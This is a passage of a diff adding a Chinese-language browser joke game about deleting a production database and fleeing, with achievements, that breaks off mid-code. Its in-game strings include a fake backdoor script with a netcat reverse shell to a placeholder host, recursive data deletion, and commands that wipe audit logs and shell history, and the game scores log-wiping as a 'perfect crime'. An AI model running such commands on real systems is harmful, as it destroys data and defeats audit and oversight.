@@ -1,0 +1,1165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚡ 删库跑路 · 成就系统版</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: 'Courier New', Courier, monospace;
+        }
+        body {
+            background: linear-gradient(145deg, #0b1f1a 0%, #0a2a1f 100%);
+            min-height: 100vh;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+        }
+        .game-container {
+            max-width: 900px;
+            width: 100%;
+            background: #0f0e0b;
+            border-radius: 24px;
+            box-shadow: 0 20px 35px rgba(0,0,0,0.8), 0 0 0 2px #3a5f4b inset, 0 0 0 4px #1e332a inset;
+            padding: 24px 20px 28px;
+            border: 2px solid #6f8f72;
+        }
+        .terminal-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 20px;
+            padding-left: 8px;
+            border-bottom: 2px solid #3b6e4b;
+            padding-bottom: 10px;
+        }
+        .terminal-header .dot {
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            background: #2e7d5a;
+            box-shadow: 0 0 0 2px #5faa7a;
+        }
+        .terminal-header .dot.red {
+            background: #ac4e3b;
+            box-shadow: 0 0 0 2px #d47b62;
+        }
+        .terminal-header .dot.yellow {
+            background: #c9a23b;
+            box-shadow: 0 0 0 2px #ebc454;
+        }
+        .terminal-header .title {
+            color: #b3f0c0;
+            font-size: 1.4rem;
+            font-weight: bold;
+            letter-spacing: 2px;
+            text-shadow: 0 0 5px #71c285;
+            flex: 1;
+            text-align: center;
+            margin-right: 50px;
+        }
+        .screen {
+            background: #0c1f17;
+            border: 3px solid #3c6e51;
+            border-radius: 18px;
+            padding: 20px 18px;
+            min-height: 360px;
+            box-shadow: inset 0 0 25px #00000099, 0 0 0 2px #5d8867;
+            color: #c6f7d0;
+            font-size: 1.15rem;
+            line-height: 1.6;
+            white-space: pre-wrap;
+            word-break: break-word;
+            margin-bottom: 20px;
+            overflow-y: auto;
+            max-height: 400px;
+            scroll-behavior: smooth;
+        }
+        .screen::-webkit-scrollbar {
+            width: 8px;
+            background: #193126;
+        }
+        .screen::-webkit-scrollbar-thumb {
+            background: #45996b;
+            border-radius: 30px;
+        }
+        .input-area {
+            background: #0b1d13;
+            border-radius: 60px;
+            border: 3px solid #4a7b5c;
+            display: flex;
+            align-items: center;
+            padding: 6px 18px;
+            margin-top: 12px;
+            box-shadow: 0 0 0 2px #1f4a30 inset;
+        }
+        .prompt {
+            color: #d0ffb0;
+            font-weight: bold;
+            font-size: 1.5rem;
+            margin-right: 10px;
+            text-shadow: 0 0 8px #9affb0;
+        }
+        #commandInput {
+            background: transparent;
+            border: none;
+            outline: none;
+            color: #e3ffe7;
+            font-size: 1.4rem;
+            width: 100%;
+            caret-color: #66ff99;
+            font-family: 'Courier New', Courier, monospace;
+            font-weight: 500;
+        }
+        #commandInput::placeholder {
+            color: #456b52;
+            font-size: 1.1rem;
+            font-style: italic;
+        }
+        .button-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin-top: 25px;
+            justify-content: center;
+        }
+        .cmd-btn {
+            background: #193d29;
+            border: 2px solid #6cab7c;
+            color: #dcffd3;
+            font-size: 1.1rem;
+            font-weight: bold;
+            padding: 8px 18px;
+            border-radius: 40px;
+            cursor: pointer;
+            transition: 0.15s;
+            font-family: 'Courier New', monospace;
+            box-shadow: 0 5px 0 #0e251a;
+            text-transform: lowercase;
+        }
+        .cmd-btn:hover {
+            background: #256b40;
+            border-color: #9effb4;
+            transform: translateY(-2px);
+            box-shadow: 0 7px 0 #0e251a;
+        }
+        .cmd-btn:active {
+            transform: translateY(4px);
+            box-shadow: 0 2px 0 #0e251a;
+        }
+        .status-bar {
+            display: flex;
+            justify-content: space-between;
+            color: #89f7b1;
+            margin: 15px 5px 5px 5px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            background: #0f271b;
+            padding: 8px 18px;
+            border-radius: 40px;
+            border: 1px solid #3f7854;
+        }
+        .danger {
+            color: #ff907c;
+            text-shadow: 0 0 5px #ff5f4a;
+        }
+        .warning {
+            color: #ffb27a;
+        }
+        .safe {
+            color: #c6f7d0;
+        }
+        .reset-link {
+            text-align: right;
+            margin-top: 10px;
+        }
+        .reset-link button {
+            background: none;
+            border: 2px solid #4e7760;
+            color: #a8e6b3;
+            font-size: 1rem;
+            padding: 5px 18px;
+            border-radius: 30px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.1s;
+        }
+        .reset-link button:hover {
+            background: #2d5f40;
+            color: white;
+        }
+        .footer-note {
+            color: #50855e;
+            text-align: center;
+            margin-top: 12px;
+            font-size: 0.9rem;
+        }
+        
+        /* 成就系统样式 */
+        .achievement-panel {
+            background: #0f271b;
+            border: 2px solid #3f7854;
+            border-radius: 16px;
+            padding: 12px 16px;
+            margin-bottom: 20px;
+            color: #b3f0c0;
+            font-size: 1rem;
+        }
+        .achievement-title {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 1.1rem;
+            letter-spacing: 1px;
+        }
+        .achievement-title:hover {
+            color: #e3ffe7;
+        }
+        .achievement-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+            margin-top: 15px;
+        }
+        .achievement-item {
+            background: #0c1f17;
+            border: 1px solid #2d6b42;
+            border-radius: 12px;
+            padding: 8px 4px;
+            text-align: center;
+            font-size: 0.9rem;
+            transition: 0.1s;
+        }
+        .achievement-item.unlocked {
+            background: #1f5a36;
+            border-color: #a6ffb4;
+            color: #e3ffe7;
+            box-shadow: 0 0 8px #5aff8c;
+        }
+        .achievement-item .emoji {
+            font-size: 1.5rem;
+            display: block;
+        }
+        .achievement-item .name {
+            font-weight: bold;
+            font-size: 0.8rem;
+        }
+        .achievement-item .desc {
+            font-size: 0.7rem;
+            color: #89c297;
+        }
+        .achievement-item.unlocked .desc {
+            color: #dcffd3;
+        }
+        .progress-bar {
+            background: #0a1f15;
+            height: 4px;
+            border-radius: 4px;
+            margin: 5px 0 0;
+        }
+        .progress-fill {
+            background: #6eff96;
+            height: 4px;
+            border-radius: 4px;
+            width: 0%;
+        }
+        .stats-row {
+            display: flex;
+            gap: 20px;
+            margin-top: 8px;
+            font-size: 0.9rem;
+            color: #89f7b1;
+        }
+    </style>
+</head>
+<body>
+<div class="game-container">
+    <div class="terminal-header">
+        <span class="dot red"></span>
+        <span class="dot yellow"></span>
+        <span class="dot"></span>
+        <span class="title">rm -rf / ★ 成就系统版</span>
+    </div>
+
+    <!-- 成就面板（可折叠） -->
+    <div class="achievement-panel" id="achievementPanel">
+        <div class="achievement-title" onclick="toggleAchievements()">
+            <span>🏆 成就系统 <span id="unlockCount">0/20</span></span>
+            <span id="toggleIcon">▼</span>
+        </div>
+        <div id="achievementContent">
+            <div class="stats-row">
+                <span>🏃 总游戏次数: <span id="totalGames">0</span></span>
+                <span>✨ S级结局: <span id="sRankCount">0</span></span>
+                <span>💀 作死次数: <span id="deathCount">0</span></span>
+            </div>
+            <div class="achievement-grid" id="achievementGrid">
+                <!-- 成就将通过JS动态生成 -->
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill" style="width: 0%;"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 主屏幕输出 -->
+    <div class="screen" id="outputScreen">
+        > 系统启动中...
+        > 您已通过跳板机连接到生产环境 [10.0.0.1]
+        >
+        ⚠️  当前目录: /data/production/db
+        ⚠️  距离自动审计日志上传还剩 5 分钟
+        >
+        输入指令开始你的删库跑路计划...
+    </div>
+
+    <!-- 输入行 -->
+    <div class="input-area">
+        <span class="prompt">$</span>
+        <input type="text" id="commandInput" placeholder="输入命令 (help / run / hide)" autofocus>
+    </div>
+
+    <!-- 快捷指令按钮 -->
+    <div class="button-grid">
+        <button class="cmd-btn" data-cmd="ls -la">📁 ls -la</button>
+        <button class="cmd-btn" data-cmd="rm -rf ./data">💣 rm -rf ./data</button>
+        <button class="cmd-btn" data-cmd="sudo su">🔐 sudo su</button>
+        <button class="cmd-btn" data-cmd="cat config.json">📄 cat config</button>
+        <button class="cmd-btn" data-cmd="./backdoor.sh">🕳️ run backdoor</button>
+        <button class="cmd-btn" data-cmd="history">📜 history</button>
+        <button class="cmd-btn" data-cmd="rm -f .hidden_audit">🗑️ 删审计</button>
+        <button class="cmd-btn" data-cmd="history -c">🧹 清历史</button>
+        <button class="cmd-btn" data-cmd="run">🏃 跑路！</button>
+        <button class="cmd-btn" data-cmd="hide">👻 隐蔽</button>
+        <button class="cmd-btn" data-cmd="achievements">🏆 成就</button>
+    </div>
+
+    <!-- 状态栏 / 危险值 -->
+    <div class="status-bar">
+        <span>🔥 风险指数: <span id="riskValue" class="danger">15</span>%</span>
+        <span>⏳ 剩余时间: <span id="timerDisplay">5:00</span></span>
+    </div>
+
+    <!-- 重置按钮 -->
+    <div class="reset-link">
+        <button id="resetBtn">⟲ 重新连接 (reset)</button>
+        <button id="clearAchievementsBtn" style="margin-left: 10px; background: #3d2b2b; border-color: #aa6a6a;">🗑️ 清空成就</button>
+    </div>
+    <div class="footer-note">[ 删库跑路 成就版 ] — 成就进度保存在浏览器中！</div>
+</div>
+
+<script>
+    (function() {
+        // ------ 游戏状态 ------
+        let risk = 15;               // 风险 0% 安全, 100% 触发审计/被抓
+        let timeLeft = 300;          // 剩余秒数 (5分钟 = 300秒)
+        let timerInterval = null;
+        let gameOver = false;         // true 表示结局已触发, 禁止操作
+        let finalMessageShown = false;
+        let currentEnding = null;     // 当前结局类型
+
+        // 指令历史
+        let commandHistory = [];
+
+        // 解锁事件标记
+        let secretBackdoorUsed = false;     // 是否执行过后门
+        let sudoObtained = false;           // 是否sudo提权过
+        let dataDeleted = false;            // 是否删过data目录
+        let auditFileDeleted = false;       // 是否删除了审计文件
+        let bashHistoryCleared = false;     // 是否清空了bash历史
+        
+        // 后门彩蛋标记
+        let backdoorEasterEggTriggered = false;
+        
+        // 隐蔽次数
+        let hideCount = 0;
+        
+        // 彩蛋相关
+        let backdoorChoice = null;          // 后门选择: 'continue' 或 'cut'
+        
+        // 是否显示过风险警告
+        let highRiskWarningShown = false;
+
+        // DOM 元素
+        const outputEl = document.getElementById('outputScreen');
+        const inputEl = document.getElementById('commandInput');
+        const riskSpan = document.getElementById('riskValue');
+        const timerSpan = document.getElementById('timerDisplay');
+        const resetBtn = document.getElementById('resetBtn');
+        const clearAchievementsBtn = document.getElementById('clearAchievementsBtn');
+
+        // ------ 成就系统 ------
+        const ACHIEVEMENTS = [
+            { id: 'first_timer', name: '初次跑路', emoji: '🏃', desc: '完成一局游戏', unlocked: false },
+            { id: 'data_deleted', name: '删库专家', emoji: '💣', desc: '删除data目录', unlocked: false },
+            { id: 'sudo_root', name: '权限狗', emoji: '🔐', desc: '获得root权限', unlocked: false },
+            { id: 'audit_clean', name: '不留痕迹', emoji: '🧹', desc: '删除审计日志', unlocked: false },
+            { id: 'history_clean', name: '失忆症', emoji: '📜', desc: '清空命令历史', unlocked: false },
+            { id: 'backdoor_used', name: '走后门', emoji: '🕳️', desc: '执行后门脚本', unlocked: false },
+            { id: 'backdoor_cut', name: '迷途知返', emoji: '🔌', desc: '切断后门逃生', unlocked: false },
+            { id: 'backdoor_continue', name: '头铁娃', emoji: '💀', desc: '继续后门作死', unlocked: false },
+            { id: 'hide_master', name: '躲猫猫高手', emoji: '👻', desc: '使用3次隐蔽', unlocked: false },
+            { id: 'perfect_crime', name: '完美犯罪', emoji: '✨', desc: 'S级结局', unlocked: false },
+            { id: 'caught', name: '当场抓获', emoji: '🚨', desc: '风险100%被抓', unlocked: false },
+            { id: 'timeout', name: '拖延症', emoji: '⏰', desc: '时间耗尽被抓', unlocked: false },
+            { id: 'fugitive', name: '亡命天涯', emoji: '🏃‍♂️', desc: 'B级结局（证据未消）', unlocked: false },
+            { id: 'almost_perfect', name: '差一点点', emoji: '🔒', desc: 'A级结局', unlocked: false },
+            { id: 'coward', name: '懦夫', emoji: '😨', desc: '什么都没干就跑路', unlocked: false },
+            { id: 'cat_config', name: '窥探者', emoji: '👀', desc: '查看config.json', unlocked: false },
+            { id: 'cat_secret', name: '解密大师', emoji: '🔑', desc: '查看secret.db', unlocked: false },
+            { id: 'cat_backdoor', name: '脚本小子', emoji: '📝', desc: '查看backdoor.sh', unlocked: false },
+            { id: 'rm_root', name: '作死小能手', emoji: '💥', desc: '尝试rm -rf /', unlocked: false },
+            { id: 'survivor', name: '极限逃生', emoji: '🎯', desc: '风险99%时跑路成功', unlocked: false }
+        ];
+
+        // 统计数据
+        let stats = {
+            totalGames: 0,
+            sRankCount: 0,
+            deathCount: 0,
+            aRankCount: 0,
+            bRankCount: 0
+        };
+
+        // 从Cookie加载成就
+        function loadAchievements() {
+            const cookies = document.cookie.split(';');
+            let achievementsData = null;
+            let statsData = null;
+            
+            for (let cookie of cookies) {
+                const [name, value] = cookie.trim().split('=');
+                if (name === 'sg_achievements') {
+                    achievementsData = decodeURIComponent(value);
+                } else if (name === 'sg_stats') {
+                    statsData = decodeURIComponent(value);
+                }
+            }
+            
+            if (achievementsData) {
+                try {
+                    const unlockedIds = JSON.parse(achievementsData);
+                    ACHIEVEMENTS.forEach(ach => {
+                        ach.unlocked = unlockedIds.includes(ach.id);
+                    });
+                } catch (e) {
+                    console.error('加载成就失败', e);
+                }
+            }
+            
+            if (statsData) {
+                try {
+                    stats = JSON.parse(statsData);
+                } catch (e) {
+                    console.error('加载统计失败', e);
+                }
+            }
+            
+            updateAchievementDisplay();
+        }
+
+        // 保存成就到Cookie
+        function saveAchievements() {
+            const unlockedIds = ACHIEVEMENTS.filter(ach => ach.unlocked).map(ach => ach.id);
+            const expiryDate = new Date();
+            expiryDate.setFullYear(expiryDate.getFullYear() + 1); // 保存1年
+            
+            document.cookie = `sg_achievements=${encodeURIComponent(JSON.stringify(unlockedIds))}; expires=${expiryDate.toUTCString()}; path=/`;
+            document.cookie = `sg_stats=${encodeURIComponent(JSON.stringify(stats))}; expires=${expiryDate.toUTCString()}; path=/`;
+            
+            updateAchievementDisplay();
+        }
+
+        // 解锁成就
+        function unlockAchievement(id) {
+            const achievement = ACHIEVEMENTS.find(a => a.id === id);
+            if (achievement && !achievement.unlocked) {
+                achievement.unlocked = true;
+                printToScreen(`\n🏆 成就解锁: ${achievement.emoji} ${achievement.name} - ${achievement.desc}`);
+                saveAchievements();
+            }
+        }
+
+        // 更新成就显示
+        function updateAchievementDisplay() {
+            const grid = document.getElementById('achievementGrid');
+            if (!grid) return;
+            
+            let html = '';
+            ACHIEVEMENTS.forEach(ach => {
+                html += `
+                    <div class="achievement-item ${ach.unlocked ? 'unlocked' : ''}">
+                        <span class="emoji">${ach.emoji}</span>
+                        <span class="name">${ach.name}</span>
+                        <span class="desc">${ach.desc}</span>
+                    </div>
+                `;
+            });
+            grid.innerHTML = html;
+            
+            const unlockedCount = ACHIEVEMENTS.filter(a => a.unlocked).length;
+            document.getElementById('unlockCount').innerText = `${unlockedCount}/${ACHIEVEMENTS.length}`;
+            
+            const progress = (unlockedCount / ACHIEVEMENTS.length) * 100;
+            document.getElementById('progressFill').style.width = progress + '%';
+            
+            // 更新统计显示
+            document.getElementById('totalGames').innerText = stats.totalGames;
+            document.getElementById('sRankCount').innerText = stats.sRankCount;
+            document.getElementById('deathCount').innerText = stats.deathCount;
+        }
+
+        // 清空成就
+        function clearAchievements() {
+            if (confirm('确定要清空所有成就吗？')) {
+                ACHIEVEMENTS.forEach(ach => ach.unlocked = false);
+                stats = { totalGames: 0, sRankCount: 0, deathCount: 0, aRankCount: 0, bRankCount: 0 };
+                saveAchievements();
+                updateAchievementDisplay();
+                printToScreen('🗑️ 成就数据已清空');
+            }
+        }
+
+        // 辅助函数: 输出到屏幕
+        function printToScreen(text, isCommand = false) {
+            if (isCommand) {
+                outputEl.innerHTML += `\n> <span style="color:#c2f2b0;">$ ${text}</span>`;
+            } else {
+                outputEl.innerHTML += `\n${text}`;
+            }
+            outputEl.scrollTop = outputEl.scrollHeight;
+        }
+
+        // 重置屏幕
+        function resetScreenWithWelcome() {
+            outputEl.innerHTML = `> 系统启动中...
+> 您已通过跳板机连接到生产环境 [10.0.0.1]
+
+⚠️  当前目录: /data/production/db
+⚠️  距离自动审计日志上传还剩 5 分钟
+
+输入指令开始你的删库跑路计划...`;
+        }
+
+        // 更新风险显示
+        function updateRisk(value) {
+            risk = Math.min(100, Math.max(0, value));
+            riskSpan.innerText = risk + '%';
+            
+            if (risk >= 90) {
+                riskSpan.style.color = '#ff5f4a';
+                riskSpan.style.textShadow = '0 0 8px red';
+                riskSpan.className = 'danger';
+                
+                if (risk >= 95 && !gameOver && !highRiskWarningShown) {
+                    printToScreen('⚠️⚠️⚠️ 风险极高！建议立即跑路！输入 run 逃跑 ⚠️⚠️⚠️');
+                    highRiskWarningShown = true;
+                }
+            } else if (risk >= 70) {
+                riskSpan.style.color = '#ffb27a';
+                riskSpan.style.textShadow = 'none';
+                riskSpan.className = 'warning';
+                highRiskWarningShown = false;
+            } else {
+                riskSpan.style.color = '#c6f7d0';
+                riskSpan.style.textShadow = 'none';
+                riskSpan.className = 'safe';
+                highRiskWarningShown = false;
+            }
+        }
+
+        // 更新时间显示
+        function updateTimerDisplay() {
+            const mins = Math.floor(timeLeft / 60);
+            const secs = timeLeft % 60;
+            timerSpan.innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
+        }
+
+        // 后门彩蛋
+        function triggerBackdoorEasterEgg() {
+            if (backdoorEasterEggTriggered || gameOver) return;
+            
+            backdoorEasterEggTriggered = true;
+            
+            let eggMessage = `
+╔══════════════════════════════════════════════════════════╗
+║                                                          ║
+║   🥚  【隐藏彩蛋：后门逃亡】  🥚                         ║
+║                                                          ║
+╠══════════════════════════════════════════════════════════╣
+║                                                          ║
+║   (远处传来警笛声，但你已从后门溜走了一半...)             ║
+║                                                          ║
+║   你通过后门连接到了外部服务器，但审计系统已经锁定你的     ║
+║   原始连接。现在你有两个选择：                           ║
+║                                                          ║
+║   1. 继续通过后门远程操作 (风险+30)                      ║
+║   2. 切断后门，就地隐藏 (风险-20)                        ║
+║                                                          ║
+╠══════════════════════════════════════════════════════════╣
+║                                                          ║
+║   输入命令继续剧情：                                      ║
+║   ▸ 继续后门 输入: continue_backdoor                     ║
+║   ▸ 切断后门 输入: cut_backdoor                          ║
+║                                                          ║
+╚══════════════════════════════════════════════════════════╝`;
+            
+            printToScreen(eggMessage);
+        }
+
+        // 游戏结束
+        function triggerEnding(message, isSuccess = false) {
+            if (gameOver) return;
+            
+            // 增加游戏次数
+            stats.totalGames++;
+            
+            let endingMsg = message;
+            let endingType = 'unknown';
+            
+            if (!message) {
+                if (risk >= 100) {
+                    endingMsg = '🚨 风险指数 100% —— 入侵检测系统触发，管理员锁定了你的会话。\n🫤 你被当场抓获。结局: 删库失败 + 银手镯。';
+                    endingType = 'caught';
+                    stats.deathCount++;
+                    unlockAchievement('caught');
+                }
+                else if (timeLeft <= 0) {
+                    endingMsg = '⏰ 5分钟已到，审计人员推门而入，你还在敲键盘。\n👮 跑路计划破产。';
+                    endingType = 'timeout';
+                    stats.deathCount++;
+                    unlockAchievement('timeout');
+                }
+                else if (dataDeleted && auditFileDeleted && bashHistoryCleared) {
+                    endingMsg = '✨✨ 完美犯罪！ ✨✨\n\n你不仅删除了核心数据，还清空了所有审计日志和历史记录。\n三天后，当管理员发现数据丢失时，没有任何线索指向你。\n你在新的城市开始了平静的生活...\n\n【结局：完美犯罪 · S级】';
+                    endingType = 's_rank';
+                    stats.sRankCount++;
+                    unlockAchievement('perfect_crime');
+                    
+                    // 如果风险99%跑路，额外解锁
+                    if (risk >= 99) {
+                        unlockAchievement('survivor');
+                    }
+                }
+                else if (dataDeleted && auditFileDeleted) {
+                    endingMsg = '🔒 数据已删除，审计日志也已清空，但命令历史可能还留下痕迹。\n你匆匆逃离，心中隐隐不安...\n\n【结局：几乎完美 · A级】';
+                    endingType = 'a_rank';
+                    stats.aRankCount++;
+                    unlockAchievement('almost_perfect');
+                }
+                else if (dataDeleted && risk < 60) {
+                    endingMsg = '⚠️ 你成功删除核心数据，趁乱溜出后门，消失在人群中...\n\n但操作日志还在服务器上！警察顺着日志很快就能找到你。\n\n【结局：逃犯 · B级】（证据未清理）';
+                    endingType = 'b_rank';
+                    stats.bRankCount++;
+                    unlockAchievement('fugitive');
+                }
+                else {
+                    endingMsg = '💥 游戏意外结束。';
+                }
+            } else {
+                // 自定义结局消息
+                if (message.includes('跑路成功')) {
+                    endingType = 's_rank';
+                    stats.sRankCount++;
+                    unlockAchievement('perfect_crime');
+                } else if (message.includes('懦夫')) {
+                    endingType = 'coward';
+                    unlockAchievement('coward');
+                }
+            }
+            
+            currentEnding = endingType;
+            
+            outputEl.innerHTML += `\n==========================================\n${endingMsg}\n==========================================`;
+            
+            gameOver = true;
+            finalMessageShown = true;
+            
+            if (timerInterval) {
+                clearInterval(timerInterval);
+                timerInterval = null;
+            }
+            
+            inputEl.disabled = true;
+            inputEl.placeholder = '游戏结束，按重置继续';
+            
+            // 保存成就
+            saveAchievements();
+        }
+
+        // 检查失败条件
+        function checkFailureCondition() {
+            if (gameOver) return true;
+            if (risk >= 100) {
+                triggerEnding();
+                return true;
+            }
+            if (timeLeft <= 0) {
+                triggerEnding();
+                return true;
+            }
+            return false;
+        }
+
+        // 处理每个命令
+        function processCommand(cmd) {
+            if (gameOver) {
+                printToScreen('系统已锁定。按「重新连接」开始新游戏。');
+                return;
+            }
+
+            const originalCmd = cmd;
+            const lowerCmd = cmd.toLowerCase().trim();
+            if (lowerCmd === '') return;
+
+            // 记录历史
+            commandHistory.push(originalCmd);
+            if (commandHistory.length > 12) commandHistory.shift();
+
+            // 打印用户输入
+            printToScreen(originalCmd, true);
+
+            // 解析命令
+            const parts = originalCmd.trim().split(' ');
+            const baseCmd = parts[0].toLowerCase();
+
+            // 成就命令
+            if (baseCmd === 'achievements' || baseCmd === '成就') {
+                let achMsg = '\n🏆 已解锁成就:\n';
+                const unlocked = ACHIEVEMENTS.filter(a => a.unlocked);
+                if (unlocked.length === 0) {
+                    achMsg += '  暂无成就，开始游戏吧！';
+                } else {
+                    unlocked.forEach(a => {
+                        achMsg += `  ${a.emoji} ${a.name} - ${a.desc}\n`;
+                    });
+                }
+                achMsg += `\n📊 总进度: ${unlocked.length}/${ACHIEVEMENTS.length}`;
+                printToScreen(achMsg);
+                return;
+            }
+
+            // 跑路命令
+            if (baseCmd === 'run' || baseCmd === 'escape' || baseCmd === '跑路') {
+                if (dataDeleted) {
+                    if (auditFileDeleted && bashHistoryCleared) {
+                        printToScreen('🏃‍♂️ 你趁着审计系统还没反应过来，拔掉网线就跑！');
+                        printToScreen('三天后，你在老家接到电话："数据丢了，是你干的吗？"');
+                        printToScreen('你淡定地说："什么数据？我在老家相亲呢。"');
+                        triggerEnding('✨ 成功跑路！数据没了，日志没了，完美！\n\n【结局：跑路成功 · S级】', true);
+                    } else if (auditFileDeleted) {
+                        printToScreen('🏃‍♂️ 你拔腿就跑，日志删了但历史还在...');
+                        printToScreen('虽然跑了，但总感觉不安心。');
+                        triggerEnding('⚠️ 跑路成功，但历史记录可能暴露你。\n\n【结局：跑路成功 · A级】', true);
+                    } else {
+                        printToScreen('🏃‍♂️ 你拔腿就跑，但忘了删审计日志...');
+                        printToScreen('一周后，警察根据日志记录找到你。');
+                        triggerEnding('🚔 你跑回家了，但三天后警察上门。\n\n【结局：跑路失败 · 证据未消】');
+                    }
+                } else {
+                    printToScreen('🏃‍♂️ 你跑路了，但数据还在...');
+                    printToScreen('这算什么删库跑路？');
+                    triggerEnding('🤔 你什么都没干就跑了，老板扣了你一个月工资。\n\n【结局：懦夫】');
+                }
+                return;
+            }
+            
+            // 隐蔽降风险
+            if (baseCmd === 'hide' || baseCmd === '隐蔽') {
+                if (hideCount >= 3) {
+                    printToScreen('你已经躲太多次了，机房没有其他地方可藏！');
+                } else {
+                    hideCount++;
+                    printToScreen('👻 你躲在机房的服务器后面，屏住呼吸...');
+                    printToScreen('审计人员从你身边走过，没有发现你！风险降低了！');
+                    updateRisk(risk - 15);
+                    printToScreen(`(隐蔽次数剩余: ${3 - hideCount})`);
+                    
+                    if (hideCount === 3) {
+                        unlockAchievement('hide_master');
+                    }
+                }
+                return;
+            }
+
+            // 后门彩蛋后续剧情
+            if (baseCmd === 'continue_backdoor') {
+                if (!backdoorEasterEggTriggered) {
+                    printToScreen('你还未触发后门彩蛋，请先执行 ./backdoor.sh');
+                } else {
+                    printToScreen('🕳️ 你选择继续通过后门操作...');
+                    printToScreen('反向连接建立，但你触发了更高级别的入侵检测！');
+                    printToScreen('系统管理员： "检测到异常出站流量，立即切断连接！"');
+                    updateRisk(risk + 30);
+                    backdoorChoice = 'continue';
+                    unlockAchievement('backdoor_continue');
+                    
+                    if (risk >= 100) {
+                        triggerEnding('🚨 你被网络警察锁定IP地址，半小时后在网吧被捕。\n\n【结局：后门逃亡失败】');
+                    } else {
+                        printToScreen('⚠️ 你侥幸逃脱，但风险已经极高！');
+                    }
+                }
+                return;
+            }
+            
+            if (baseCmd === 'cut_backdoor') {
+                if (!backdoorEasterEggTriggered) {
+                    printToScreen('你还未触发后门彩蛋，请先执行 ./backdoor.sh');
+                } else {
+                    printToScreen('🔌 你果断切断后门连接，就地隐藏...');
+                    printToScreen('你躲在机房的服务器后面，等审计人员离开后才悄悄溜走。');
+                    printToScreen('虽然数据删了，但没人发现是你干的！');
+                    updateRisk(risk - 20);
+                    backdoorChoice = 'cut';
+                    unlockAchievement('backdoor_cut');
+                    
+                    if (risk < 0) risk = 0;
+                    
+                    printToScreen('✅ 风险降低了！现在可以安全跑路了！');
+                }
+                return;
+            }
+
+            // help 
+            if (baseCmd === 'help' || baseCmd === '？' || baseCmd === '?') {
+                printToScreen('可用命令:');
+                printToScreen('  ls [-la]              查看当前目录');
+                printToScreen('  cat <file>            查看文件');
+                printToScreen('  rm -rf <dir>          删除目录');
+                printToScreen('  rm -f <file>          删除文件');
+                printToScreen('  sudo su               尝试提权');
+                printToScreen('  ./backdoor.sh         执行后门脚本');
+                printToScreen('  history               显示输入历史');
+                printToScreen('  history -c            清空历史记录');
+                printToScreen('  clear                 清屏');
+                printToScreen('  hide                   隐蔽（降低风险）');
+                printToScreen('  run / escape           跑路！提前结束游戏');
+                printToScreen('  achievements           查看成就');
+                printToScreen('  [其他] 会触发未知风险');
+                updateRisk(risk + 2);
+            }
+
+            // ls 
+            else if (baseCmd === 'ls') {
+                let option = parts[1] || '';
+                if (option === '-la' || option === '-l') {
+                    let fileList = 'total 64\n';
+                    fileList += 'drwxr-x---  7 root  root    4096 Feb 24 13:37 .\n';
+                    fileList += 'drwxr-x---  7 root  root    4096 Feb 24 13:37 ..\n';
+                    fileList += '-rw-r--r--  1 db    db      1223 Feb 24 13:20 config.json\n';
+                    fileList += '-rw-------  1 db    db     32768 Feb 24 13:35 secret.db\n';
+                    
+                    if (!dataDeleted) {
+                        fileList += 'drwx------  2 db    db      4096 Feb 23 09:12 data\n';
+                    }
+                    
+                    fileList += '-rwxr-xr-x  1 db    db       214 Feb 24 12:44 backdoor.sh\n';
+                    
+                    if (!auditFileDeleted) {
+                        fileList += '--w-------  1 root  root       6 Feb 24 10:05 .hidden_audit\n';
+                    }
+                    
+                    printToScreen(fileList);
+                    updateRisk(risk + 1);
+                } else {
+                    let fileList = 'config.json  secret.db  ';
+                    if (!dataDeleted) fileList += 'data  ';
+                    fileList += 'backdoor.sh';
+                    printToScreen(fileList);
+                    updateRisk(risk + 0);
+                }
+            }
+
+            // cat 
+            else if (baseCmd === 'cat') {
+                if (parts.length < 2) {
+                    printToScreen('用法: cat <文件名>');
+                } else {
+                    const file = parts[1];
+                    if (file === 'config.json') {
+                        printToScreen('{ "database": "production", "host": "10.0.0.1", "user": "app_user", "password": "★secret★" }');
+                        updateRisk(risk + 5);
+                        unlockAchievement('cat_config');
+                    } else if (file === 'secret.db') {
+                        printToScreen('� 二进制数据乱码 ... 似乎包含用户密钥。');
+                        printToScreen('提示: 需要解密工具，但你急着跑路没空看。');
+                        updateRisk(risk + 3);
+                        unlockAchievement('cat_secret');
+                    } else if (file === 'backdoor.sh') {
+                        printToScreen('#!/bin/bash');
+                        printToScreen('echo "Connecting to C2 server..."');
+                        printToScreen('nc -e /bin/bash 203.0.113.99 4444 &');
+                        printToScreen('# 记得清理日志');
+                        updateRisk(risk + 8);
+                        unlockAchievement('cat_backdoor');
+                    } else if (file === '.hidden_audit' || file === 'hidden_audit') {
+                        if (auditFileDeleted) {
+                            printToScreen(`cat: ${file}: No such file or directory`);
+                        } else {
+                            printToScreen('Feb 24 13:37:21 [audit] user=db command="rm -rf ./data" status=SUCCESS\nFeb 24 13:38:15 [audit] user=db command="sudo su" status=SUCCESS');
+                            printToScreen('⚠️  这是审计日志！记录了你的所有操作！');
+                            updateRisk(risk + 1);
+                        }
+                    } else {
+                        printToScreen(`cat: ${file}: No such file or directory`);
+                        updateRisk(risk + 1);
+                    }
+                }
+            }
+
+            // rm -rf 核心操作
+            else if (baseCmd === 'rm' && parts[1] === '-rf' && parts.length >= 3) {
+                const target = parts[2];
+                if (target === './data' || target === 'data' || target === '/data/production/db/data') {
+                    if (dataDeleted) {
+                        printToScreen('rm: 目录 data 已经不存在了。你还想删什么？');
+                        updateRisk(risk + 3);
+                    } else {
+                        printToScreen('⚠️  正在递归删除 data 目录...');
+                        printToScreen('🧾 删除 128 个表， 3.2GB 数据 ... 完成');
+                        printToScreen('💀 核心数据已删除！ 但操作日志已被记录。');
